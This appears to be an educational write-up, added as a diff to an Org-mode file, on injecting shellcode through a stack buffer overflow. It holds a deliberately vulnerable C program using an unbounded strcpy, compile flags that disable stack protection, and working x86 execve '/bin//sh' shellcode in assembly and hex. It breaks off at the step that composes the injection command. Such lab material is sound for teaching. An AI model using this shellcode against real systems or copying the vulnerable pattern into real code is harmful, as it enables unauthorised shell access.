@@ -1,0 +1,97 @@
+#+title: Shell Code Injection
+#+LATEX_CLASS: article
+#+LATEX_HEADER: \usepackage[a4paper]{geometry}
+#+LATEX_HEADER: \usepackage{hyperref}
+#+LATEX_HEADER: \geometry{verbose,tmargin=1in,bmargin=1in,lmargin=.6in,rmargin=.6in}
+#+LATEX_HEADER: \usepackage{fancyhdr}
+#+LATEX_HEADER: \setlength{\headheight}{15.0pt}
+#+LATEX_HEADER: \pagestyle{fancy}
+\newpage
+
+* Prerequisites: 
+Refer to this
+\href{https://chang2000.github.io/blog/2019/09/29/Exploit/}{*NOTE*}
+
+* Scenario & Setting Up
+Exploit a system to gain *shell access*. 
+
+Our ~inj.c~:
+#+begin_src c
+#include <stdio.h>
+#include <string.h>
+
+void func(char *name)
+{
+    char buf[100];
+    strcpy(buf, name);
+    printf("Welcome %s\n", buf);
+}
+
+int main(int argc, char *argv[])
+{
+    func(argv[1]);
+    return 0;
+}
+#+end_src
+
+*Note:* we need to compile it with
+
+#+begin_src bash
+gcc inj.c -o inj -fno-stack-protector -z execstack -m32 -mpreferred-stack-boundary=2
+#+end_src
+
+
+* Shell Code Injection
+
+** Analysis
+Clearly, there is a vulnerability in ~inj.c~. The ~strcpy~ doesn't
+specify a maximum length while copying, /which will cause
+*segmentation fualt*/.
+
+Let's disassemble the program:
+#+begin_src bash
+objdump -d -M intel inj
+#+end_src
+
+\href{https://pastebin.com/YihwwsvD}{Full output}
+
+From ~<func>~, we see the 7-th line, 
+~80483b1:   8d 45 9c                lea    eax,[ebp-0x64]~
+
+we can say that buffer takes ~64~ bytes, which is $6*16 + 4 = 100$
+bytes in decemal. The next 4 bytes is %ebp and the next will be our
+*target*(/4 bytes/).
+
+** Preparation of Shell Code
+Our Shell Code:
+#+begin_src nasm
+xor     eax, eax    ;Clearing eax register
+push    eax         ;Pushing NULL bytes
+push    0x68732f2f  ;Pushing //sh
+push    0x6e69622f  ;Pushing /bin
+mov     ebx, esp    ;ebx now has address of /bin//sh
+push    eax         ;Pushing NULL byte
+mov     edx, esp    ;edx now has address of NULL byte
+push    ebx         ;Pushing address of /bin//sh
+mov     ecx, esp    ;ecx now has address of address
+                    ;of /bin//sh byte
+mov     al, 11      ;syscall number of execve is 11
+int     0x80        ;Make the system call
+#+end_src
+
+Use ~nasm -f elf shellcode.asm~ to compile it.
+
+Convert the shellcode to 
+~\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80~
+
+(/this should be same even for different envs/).
+
+
+** Find a possible place to inject shellcode
+
+In the example, ~buf~ is a perfect target because we can modify it as
+we like. How do we know what address ~buf~ will be loaded in stack?
+
+Use *GDB*: ~gdb -q inj~ to find the address of the buffer.
+
+** Compose the injection command
